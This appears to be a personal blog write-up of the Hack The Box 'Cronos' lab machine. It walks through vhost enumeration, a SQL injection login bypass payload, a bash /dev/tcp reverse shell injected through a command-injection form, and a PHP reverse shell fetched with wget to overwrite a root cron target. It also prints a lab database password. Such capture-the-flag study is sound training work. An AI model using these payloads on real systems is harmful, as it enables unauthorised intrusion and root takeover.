@@ -1,0 +1,284 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+<head>
+	<title>Cronos — HTB Writeup | Brett Berard</title>
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<meta name="description"
+		content="Hack The Box: Cronos (Linux, Medium) writeup — vhost enumeration, SQL injection auth bypass, OS command injection, and privilege escalation via a root-owned Laravel cron job." />
+	<link rel="icon" type="image/svg+xml" href="../images/favicon.svg">
+	<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="../assets/css/main.css" />
+	<link rel="stylesheet" href="../assets/css/writeup.css" />
+</head>
+
+<body class="writeup-page">
+
+	<!-- BG -->
+	<div id="bg"></div>
+	<canvas id="bg-canvas"></canvas>
+	<div class="scanlines"></div>
+
+	<div class="writeup-shell">
+
+		<!-- Top bar -->
+		<nav class="writeup-topbar">
+			<a href="../index.html#writeups" class="back-link"><span class="icon solid fa-arrow-left"></span>Back to
+				writeups</a>
+			<a href="../index.html" class="site-name">Brett Berard</a>
+		</nav>
+
+		<!-- Writeup -->
+		<article id="writeup">
+
+			<header class="writeup-head">
+				<div class="platform-tag">Hack The Box</div>
+				<h1>Cronos</h1>
+				<p class="subtitle">A Linux box rooted through vhost enumeration to a hidden admin panel, a SQL
+					injection authentication bypass, OS command injection for an initial foothold, and privilege
+					escalation via a root-owned Laravel <code>artisan</code> cron job.</p>
+				<ul class="box-meta">
+					<li><span>Box</span><strong>Cronos</strong></li>
+					<li><span>OS</span><strong>Linux</strong></li>
+					<li class="diff-medium"><span>Difficulty</span><strong>Medium</strong></li>
+					<li><span>Platform</span><strong>HackTheBox</strong></li>
+					<li><span>Date</span><strong>Sep 30, 2026</strong></li>
+					<li class="status"><span>Status</span><strong>Rooted</strong></li>
+				</ul>
+			</header>
+
+			<p>Note: I have some key environment variables set that make my experience using Hack The Box much smoother
+				in my opinion. Rather than typing out or remembering file paths or IPs.</p>
+
+			<pre><code>┌──(kali㉿kali)-[~/htb/cronos]
+└─$ echo $SUBS
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+┌──(kali㉿kali)-[~/htb/cronos]
+└─$ echo $DIRS
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+┌──(kali㉿kali)-[~/htb/cronos]
+└─$ echo $IP
+10.129.227.211
+
+┌──(kali㉿kali)-[~/htb/cronos]
+└─$ echo $DOMAIN
+cronos.htb</code></pre>
+
+			<h2>Recon</h2>
+
+			<pre><code># Nmap 7.99 scan initiated Thu Oct  1 15:06:53 2026 as: /usr/lib/nmap/nmap -sCV -p- -T4 -o nmap.txt 10.129.227.211
+Nmap scan report for cronos.htb (10.129.227.211)
+Host is up (0.0080s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
+|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
+|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
+53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
+| dns-nsid:
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Cronos
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# Nmap done at Thu Oct  1 15:07:23 2026 -- 1 IP address (1 host up) scanned in 29.92 seconds</code></pre>
+
+			<p>I see port 80 open so I add the IP to my <code>/etc/hosts</code> file so DNS resolves.</p>
+
+			<figure>
+				<img src="../images/writeups/cronos/01-homepage.png" alt="The Cronos website landing page" />
+				<figcaption>The Cronos landing page</figcaption>
+			</figure>
+
+			<p>From here I am able to see that the site links to various Laravel related resources. Investigating these
+				links shows that Laravel appears to be a PHP based web application framework.</p>
+
+			<h2>Enumeration</h2>
+
+			<p>I went a bit out of bounds here and used subdomain enumeration to find the admin subdomain rather than DNS
+				zone transfer, which seems to have been intended.</p>
+
+			<pre><code>┌──(kali㉿kali)-[~/htb/cronos]
+└─$ gobuster vhost -u http://$DOMAIN -w $SUBS --append-domain
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://cronos.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+admin.cronos.htb Status: 200 [Size: 1547]
+Progress: 4989 / 4989 (100.00%)
+===============================================================
+Finished
+===============================================================</code></pre>
+
+			<h2>Foothold</h2>
+
+			<p>Navigating to the admin page I am presented with a login form. After just reading about Laravel I wonder
+				if this page is potentially vulnerable to SQL injection.</p>
+
+			<p>I ran through some standard SQL injection payloads till I found one that worked: <code>' or 1=1#</code></p>
+
+			<figure>
+				<img src="../images/writeups/cronos/02-sqli-bypass.png"
+					alt="Admin panel after SQL injection authentication bypass" />
+				<figcaption>Authentication bypassed with <code>' or 1=1#</code></figcaption>
+			</figure>
+
+			<p>From here I found a form that I found to be vulnerable to OS command injection.</p>
+
+			<figure>
+				<img src="../images/writeups/cronos/03-command-injection.png"
+					alt="Admin net tool form vulnerable to OS command injection" />
+				<figcaption>The net tool form, vulnerable to OS command injection</figcaption>
+			</figure>
+
+			<p>Knowing that this was now executing commands on the host I went to establish a reverse shell on my attack
+				machine.</p>
+
+			<pre><code>8.8.8.8; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.219/9999 0&gt;&amp;1'</code></pre>
+
+			<figure>
+				<img src="../images/writeups/cronos/04-reverse-shell.png" alt="Reverse shell caught as www-data" />
+				<figcaption>Reverse shell as www-data</figcaption>
+			</figure>
+
+			<h2>Privilege Escalation</h2>
+
+			<p>Now as www-data I started to enumerate potential privilege escalation paths.</p>
+
+			<p>I found that we are able to read the user flag as www-data.</p>
+
+			<pre><code>www-data@cronos:/home/noulis$ ls
+user.txt
+www-data@cronos:/home/noulis$ cat user.txt
+<span class="redacted">[REDACTED]</span></code></pre>
+
+			<p>This indicated to me that I am most likely not going to have to escalate privileges again to noulis in
+				order to get a root shell.</p>
+
+			<p>After some manual enumeration through common vectors like OS version, file permissions, and capabilities, I
+				found an interesting cron job.</p>
+
+			<pre><code>www-data@cronos:/home/noulis$ crontab -l; cat /etc/crontab
+no crontab for www-data
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+* * * * *	root	php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1
+#</code></pre>
+
+			<p>The cron job that stands out to me is the one that will run artisan as root. Essentially we can just
+				re-write this artisan file with a reverse shell and get root access.</p>
+
+			<p>To do that I first copied a PHP reverse shell payload into my current working directory on my attack
+				box.</p>
+
+			<pre><code>cp /usr/share/webshells/php/php-reverse-shell.php shell.php</code></pre>
+
+			<p>I changed some key configuration in the payload to match my environment.</p>
+
+			<pre><code>set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.15.219';  // CHANGED THIS
+$port = 7777;          // CHANGED THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;</code></pre>
+
+			<p>From there I started a simple HTTP server on port 8000 so I could get the payload onto the target
+				machine.</p>
+
+			<pre><code>python -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)</code></pre>
+
+			<p>I started up my listener in anticipation for when the cron job ran the payload.</p>
+
+			<pre><code>┌──(kali㉿kali)-[~]
+└─$ penelope -p 7777
+[+] Listening for reverse shells on 0.0.0.0:7777 -&gt; 127.0.0.1 • 172.22.74.149 • 10.10.15.219</code></pre>
+
+			<p>On the target box I emptied the artisan file and got my payload from the HTTP server.</p>
+
+			<pre><code>www-data@cronos:/var/www/laravel$ wget 10.10.15.219:8000/shell.php -o artisan</code></pre>
+
+			<p>Then I waited for a root shell.</p>
+
+			<figure>
+				<img src="../images/writeups/cronos/05-root-shell.png" alt="Root shell caught by the listener" />
+				<figcaption>Root shell caught by the listener</figcaption>
+			</figure>
+
+			<h2>Credentials</h2>
+
+			<p>Within <code>config.php</code> I found some credentials, but these did not seem to equate to anything. It's
+				worth noting though for practice.</p>
+
+			<pre><code>www-data@cronos:/var/www/admin$ cat config.php
+&lt;?php
+   define('DB_SERVER', 'localhost');
+   define('DB_USERNAME', 'admin');
+   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
+   define('DB_DATABASE', 'admin');
+   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+?&gt;</code></pre>
+
+			<h2>Flags</h2>
+
+			<pre><code>www-data@cronos:/home/noulis$ cat user.txt
+<span class="redacted">[REDACTED]</span>
+
+root@cronos:/# cat /root/root.txt
+<span class="redacted">[REDACTED]</span></code></pre>
+
+			<h2>Lessons Learned</h2>
+
+			<p>What I enjoyed most about this box is its reliance on basic vulnerabilities. Initial access was not based
+				on pre-written exploits or CVEs but rather enumeration, SQL injection and OS command injection. If you
+				were not familiar with these concepts you may have struggled with this box. This box helped me sharpen my
+				skills in establishing reverse shells and double checking syntax in key commands.</p>
+
+		</article>
+
+		<!-- Footer -->
+		<footer class="writeup-foot">
+			<p>Securing the Digital World | &copy; 2025 Brett Berard.</p>
+		</footer>
+
+	</div>
+
+	<!-- Scripts -->
+	<script src="../assets/js/background.js"></script>
+
+</body>
+
+</html>
